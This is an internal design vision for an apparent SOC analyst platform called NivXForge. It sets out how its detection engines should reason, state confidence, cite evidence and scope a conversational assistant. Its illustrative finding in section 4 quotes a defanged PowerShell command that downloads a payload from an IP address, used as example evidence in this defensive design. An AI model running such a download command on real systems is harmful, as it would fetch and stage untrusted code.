# NivXForge — Analyst Reasoning Vision

**Status:** Long-horizon operating vision (not a build ticket)
**Date:** 2026-02-28
**Relationship to other docs:**
- `NORTH_STAR.md` §6 defines the twenty engines. This doc defines **how they think**.
- `PRODUCT_CHARTER.md` defines governance principles. This doc adds two operating principles (§3).
- `adr/0006-nivxforge-first-class-analyst-platform.md` (Proposed) covers UI/IA parity. This doc is **separate**: it covers reasoning-engine evolution.

---

## 1 · The gap this vision closes

**Today (Workspace):**
```
Decode → Extract → Display
```
Excellent engineering. Deterministic. Traceable. But it stops at "here is what
was found."

**Target (NivXForge):**
```
Decode → Understand → Reason → Correlate → Explain → Recommend → Learn
```
The missing verbs are **Reason** and **Correlate**. Every other capability already
exists in some form; the reasoning layer binds them together.

---

## 2 · The analyst's cognitive pipeline

Every real SOC investigation is a nine-stage mental process. NivXForge's engines
should map onto these stages so an analyst can *see the reasoning*, not just the
answer.

| Stage | Question the analyst is asking                          | Owning engine (per NORTH_STAR §6)                |
| ----- | ------------------------------------------------------- | ------------------------------------------------ |
| 1. Classify   | "What am I looking at?"                        | Input Classifier                                 |
| 2. Decode     | "What does it say when unwrapped?"             | Recursive Decoder + Command Obfuscation (ADR-0001) |
| 3. Extract    | "What observables are present?"                | Evidence Extractor (IOCs, URLs, files, mutexes)  |
| 4. Understand | "What is it *doing*?"                          | Behavior Engine                                  |
| 5. Reason     | "**Why** is this suspicious?"                  | **Hypothesis Engine** *(missing today)*          |
| 6. Correlate  | "Have I seen this before?"                     | **Correlation Engine** *(missing today)*         |
| 7. Attribute  | "Which technique / family / actor?"            | MITRE Mapper + Threat Intel                      |
| 8. Explain    | "What evidence backs each conclusion?"         | Evidence Ledger (`core/evidence.py`)             |
| 9. Recommend  | "What should the analyst do next?"             | Playbook / Next-Steps Engine *(future)*          |
| ↻. Learn      | "What did the analyst correct? Update priors." | Analyst Corrections + Learner                    |

The **Reason** and **Correlate** stages are the reasoning layer — the part that
turns a decoder into an analyst assistant.

---

## 3 · Operating principles introduced by this vision

These are additive to the Product Charter and MUST hold for every reasoning-layer
addition.

### 3.1 Evidence-backed conclusions (already in `core/evidence.py`)
Every Finding is a four-tuple: `(claim · evidence · engine · confidence)`. A
Finding with zero Evidence is rejected structurally, not by convention.

### 3.2 Confidence + uncertainty labels — never "100% accurate"
NivXForge MUST NOT present a conclusion without a bounded confidence. Cybersecurity
artifacts are frequently ambiguous or incomplete; a system that claims certainty
where none exists destroys analyst trust. Rules:
- Confidence is bounded `[0.0, 1.0]` and MUST accompany every Finding.
- Findings below a per-engine calibration threshold are surfaced as "hypotheses,"
  not "verdicts."
- The Verdict card MUST show the *lowest* confidence in the supporting chain, not
  the highest (weakest-link rule).
- The UI MUST NOT display the string "100%" for any confidence value — cap at 99%
  and label 99% as "high confidence, verify".

### 3.3 Deterministic where possible, probabilistic where necessary
Prefer deterministic detectors (rules, YARA, structural invariants, hash lookups).
Fall back to probabilistic reasoning (LLM, statistical) only when deterministic
options are exhausted, and always label the output as such.

### 3.4 Explain-the-reasoning is a first-class output
Every conclusion the platform shows an analyst MUST answer three questions on the
same surface:
- **What** did it find?
- **Why** does it matter?
- **What evidence** supports it?

If any of the three is missing, the conclusion is not shown.

### 3.5 Learn from corrections, not from usage
The Learner engine (existing) updates priors *only* from explicit analyst
corrections (existing `analyst_corrections` collection). It does not learn from
inferred behaviour (clicks, dwell time) — that would corrupt priors with UI noise.

---

## 4 · What "reasoning" looks like on-screen

Illustrative — this is NOT a UI spec.

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FINDING · PowerShell downloads external payload         (T1105)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Evidence      Invoke-WebRequest -Uri hxxp://45.83.12.7/x.dat
              (extracted from decoded stage 2)
Engine        recursive-decoder → command-analyzer
Confidence    0.97 · high · deterministic
Why           Network retrieval followed by execution is
              stage 1 of the Ingress Tool Transfer chain.
Related       Case 0007 · Case 0011 (same VPS block 45.83.12/24)
Next step     Pivot to /threat-intel for hxxp://45.83.12.7/
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

Notice: **Finding · Evidence · Engine · Confidence · Why · Related · Next step**.
Any Finding rendered without all six sections is a UI bug, not a UX choice.

---

## 5 · How this vision maps to the governance model

This vision does **not** authorise speculative construction of the Hypothesis
Engine, Correlation Engine, or Recommender.

Instead, it defines the **shape** of what those engines must be if evidence ever
justifies them:
- The Correlation Engine is built the first time we see a repeated pattern across
  ≥3 real SOC cases (per REAL_WORLD_LOG.md), and an ADR is drafted and accepted.
- The Hypothesis Engine is built when analyst corrections show that "why is this
  suspicious?" is the most frequent missing feedback on real cases.
- The Recommender is built when analysts repeatedly ask "what next?" — again,
  measured, not assumed.

**Nothing here changes the governance discipline.** Real case → observation →
recurrence → ADR → implementation. This document tells future ADRs what shape
their implementation must take.

---

## 6 · What this vision does NOT change (right now)

- No new engines are built by this document.
- No changes to Workspace.
- No changes to the ADR-0006 (analyst-platform-parity) scope.
- The 46 existing pytest gates remain the enforcement mechanism for what's built.

---

## 7 · Sequencing with ADR-0006

- **ADR-0006** (Proposed) — NivXForge as a first-class **analyst platform** (UI/IA parity).
  Keeps NivXForge and Workspace analytically equivalent.
- **Future ADR-0007 and beyond** — Reasoning-layer engines, drafted when real cases
  justify them, using the shape this document defines.

The two tracks are independent. ADR-0006 can proceed without the reasoning vision
being implemented; the reasoning vision can proceed without ADR-0006 being
accepted. But **when both exist**, NivXForge is the surface that showcases the
reasoning layer while Workspace remains the deterministic decoder.

---

## 8 · What we need from real cases before building the reasoning layer

The reasoning layer is expensive and easy to build badly. Before drafting any
engine ADR beyond ADR-0001, we need real-world evidence of at least these:

1. **Correlation Engine** — ≥3 real cases where the analyst manually recognised
   "I've seen this infrastructure/family/chain before" and NivXRay didn't surface it.
2. **Hypothesis Engine** — ≥3 real cases where the analyst had to explain "why
   is this suspicious" *because NivXRay didn't*.
3. **Recommender** — ≥3 real cases where the analyst asked "what should I do next"
   and there was no in-tool guidance.

Each of these becomes an entry in REAL_WORLD_LOG.md. When the pattern hits three,
we draft an ADR. Not before.

---

## 9 · Interaction model (long-horizon)

**Adopted 2026-02-28** — operator direction that NivXForge, at maturity, should
support a conversational analyst experience *without* becoming a general-purpose
assistant.

### What the interaction should feel like
```
Analyst:  Analyze this PowerShell.
NivXForge: <Verdict · Evidence · Decode chain · IOCs · MITRE · TI · Attack Story>

Analyst:  Why T1105?
NivXForge: <cites the specific Evidence + Engine that produced that mapping>

Analyst:  Compare with previous investigations.
NivXForge: <similarities, differences, recurring infrastructure — grounded in
           historical cases in the corpus, not in speculation>

Analyst:  Generate an executive report.
NivXForge: <a report grounded in *this* investigation's evidence>
```

### Rules that make it "investigation-centric," not "general-purpose"

1. **The conversation is scoped to the current investigation** — the assistant may
   reference the historical corpus (REAL_WORLD_LOG.md, prior cases) but MUST NOT
   answer questions unrelated to cybersecurity investigation.
2. **Every answer cites the underlying Evidence, Engine, and Confidence.** Cf. §3.4.
3. **"I don't know" is a first-class answer.** If the evidence doesn't support a
   claim, the assistant says so; it does NOT extrapolate.
4. **Follow-ups must not weaken determinism.** Asking "why?" surfaces the existing
   reasoning; it does NOT re-run the analysis with a different (weaker) model.
5. **No conversational memory across investigations by default.** Each case is a
   fresh evidence set. Cross-case comparisons are opt-in and MUST be explicit.

### Why this is not authorized to be built now

This interaction model is a long-horizon target. It requires:
- A stable analyst-parity surface (Phase 1 · done).
- ≥3 recurring real cases where analysts asked follow-up questions that the current
  static rendering couldn't answer.
- An ADR (future ADR-0009 or later) drafted from that evidence.

Until then, this section is a **design constraint** for future conversational work,
not a build ticket. It exists so that when the evidence *does* justify a
conversational surface, we already know the shape it must take.

